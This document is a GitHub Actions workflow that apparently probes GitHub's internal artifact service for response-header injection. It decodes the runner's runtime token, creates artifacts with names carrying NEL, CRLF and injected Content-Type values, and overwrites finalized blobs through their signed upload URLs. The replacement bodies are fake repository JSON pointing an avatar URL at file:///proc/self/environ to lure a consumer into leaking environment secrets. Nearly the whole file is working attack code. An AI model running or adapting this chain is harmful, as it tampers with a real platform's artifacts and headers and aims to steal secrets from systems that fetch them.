name: Repo Cassette artifact name header probe

on:
  workflow_dispatch:

permissions:
  actions: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Inspect artifact-name effects on download headers
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ github.token }}
        with:
          script: |
            const {createHash} = require('node:crypto');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            if (!token || !resultsUrl) throw new Error('Runtime artifact credentials unavailable');
            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
            const scope = payload.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
            if (!scope) throw new Error('Actions.Results scope missing');
            const [, runId, jobId] = scope.split(':');
            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
            const base = new URL(resultsUrl).origin;
            const service = '/twirp/github.actions.results.api.v1.ArtifactService/';
            const repo = process.env.GITHUB_REPOSITORY;
            const nel = '\u0085';
            const run = process.env.GITHUB_RUN_ID;
            const cases = [
              ['nel_suffix', `cassette-${run}.json${nel}`],
              ['percent_nel', `cassette-${run}%85.json`],
              ['rsct_query', `cassette-${run}?rsct=application%2Fjson%85`],
              ['fragment', `cassette-${run}#frag.json`],
              ['slash', `cassette-${run}/payload.json`],
              ['percent_crlf', `cassette-${run}%0D%0AContent-Type%3A%20application%2Fjson%85`],
              ['unicode_line', `cassette-${run}\u2028.json`]
            ];
            const cleanReason = d => String(d?.msg || d?.code || '').slice(0, 100).replace(/https?:\/\/\S+/g, '[url]');
            const hex = s => Buffer.from(s, 'utf8').toString('hex');

            async function rpc(method, body) {
              const response = await fetch(base + service + method, {
                method: 'POST',
                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
                body: JSON.stringify(body)
              });
              return {status: response.status, data: await response.json().catch(() => ({}))};
            }

            async function putBlob(url, bytes) {
              const response = await fetch(url, {
                method: 'PUT',
                headers: {
                  'x-ms-blob-type': 'BlockBlob',
                  'x-ms-blob-content-type': `application/json${nel}`,
                  'x-ms-version': '2023-11-03',
                  'Content-Type': 'application/octet-stream'
                }, body: bytes
              });
              if (!response.ok) throw new Error(`Azure status=${response.status} code=${response.headers.get('x-ms-error-code') || 'unknown'}`);
            }

            for (const [label, name] of cases) {
              const created = await rpc('CreateArtifact', {...ids, name, version: 7, mime_type: 'application/json'});
              core.info(`NAME ${label} create_status=${created.status} ok=${created.data.ok === true} reason=${cleanReason(created.data)}`);
              if (created.status !== 200 || created.data.ok !== true) continue;
              const uploadUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
              if (!uploadUrl) throw new Error(`${label} missing signed upload URL`);
              const placeholder = Buffer.from('{"probe":"placeholder"}');
              try { await putBlob(uploadUrl, placeholder); }
              catch { core.info(`NAME ${label} upload_error`); continue; }
              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
              const finalized = await rpc('FinalizeArtifact', {...ids, name, size: String(placeholder.length), hash});
              core.info(`NAME ${label} finalize_status=${finalized.status} ok=${finalized.data.ok === true} reason=${cleanReason(finalized.data)}`);
              if (finalized.status !== 200 || finalized.data.ok !== true) continue;
              const artifactId = finalized.data.artifact_id || finalized.data.artifactId;
              const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
              const bytes = Buffer.from(JSON.stringify({
                full_name: repository,
                owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                description: label
              }));
              try { await putBlob(uploadUrl, bytes); }
              catch { core.info(`NAME ${label} overwrite_error`); continue; }
              const first = await fetch(`https://api.github.com/repos/${repository}`, {
                headers: {
                  'Accept': 'application/vnd.github.v3+json',
                  'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`
                }, redirect: 'manual'
              });
              if (first.status !== 302) {
                core.info(`NAME ${label} artifact_id=${artifactId} api_status=${first.status}`);
                continue;
              }
              const location = first.headers.get('location');
              if (!location) throw new Error(`${label} download lacked Location`);
              const params = new URL(location).searchParams;
              const rsct = params.getAll('rsct').map(hex).join(',') || 'absent';
              const rscd = params.getAll('rscd').map(hex).join(',') || 'absent';
              let downloaded;
              try { downloaded = await fetch(location); }
              catch { core.info(`NAME ${label} artifact_id=${artifactId} download_error`); continue; }
              const body = Buffer.from(await downloaded.arrayBuffer());
              const type = downloaded.headers.get('content-type') || '';
              core.info(`NAME ${label} artifact_id=${artifactId} status=${downloaded.status} rsct_utf8_hex=${rsct} rscd_utf8_hex=${rscd} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')} body_matches=${body.equals(bytes)}`);
            }
